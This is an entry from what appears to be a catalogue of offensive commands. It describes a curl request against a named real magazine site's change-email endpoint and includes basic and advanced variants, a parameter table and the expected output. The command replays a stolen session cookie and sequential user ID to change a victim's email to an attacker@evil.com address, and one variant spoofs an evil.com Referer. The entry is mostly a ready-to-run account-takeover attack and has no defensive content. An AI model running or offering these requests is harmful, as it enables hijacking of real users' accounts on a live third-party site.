---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
data: >-
  curl -X POST -b "session_id=abc123"
  https://atavist.com/cms/ajax/change_email.php -d
  "user_id=123&new_email=attacker@evil.com"
tags:
  - csrf
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:50.147Z'
verified: false
validated: true
submitted: true
---
# curl-csrf-email-change

## Command

```bash
curl -X POST -b "session_id=abc123" https://atavist.com/cms/ajax/change_email.php -d "user_id=123&new_email=attacker@evil.com"
```

## Description

This command simulates a CSRF attack by forging a POST request to change the email address in Atavist Magazine without CSRF protection, using a stolen session cookie and sequential user ID.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method for state change | Yes |
| `-b "session_id=abc123"` | Includes victim's session cookie | Yes |
| `-d "user_id=123&new_email=attacker@evil.com"` | Payload with user ID and new email | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -b "session_id=abc123" https://atavist.com/cms/ajax/change_email.php -d "user_id=123&new_email=new@evil.com"
```

### Advanced Usage

```bash
curl -X POST -b "session_id=abc123; other_cookie=val" -H "Referer: https://evil.com" https://atavist.com/cms/ajax/change_email.php -d "user_id=123&new_email=new@evil.com&confirm=1"
```

## Expected Output

HTTP 200 OK response with JSON like {"success": true, "message": "Email updated"}. Failure if session invalid: 403 Forbidden.

## Related

- [[commands/curl-csrf-credit-delete]]
- [[procedures/Demonstrate-CSRF-Exploitation]]
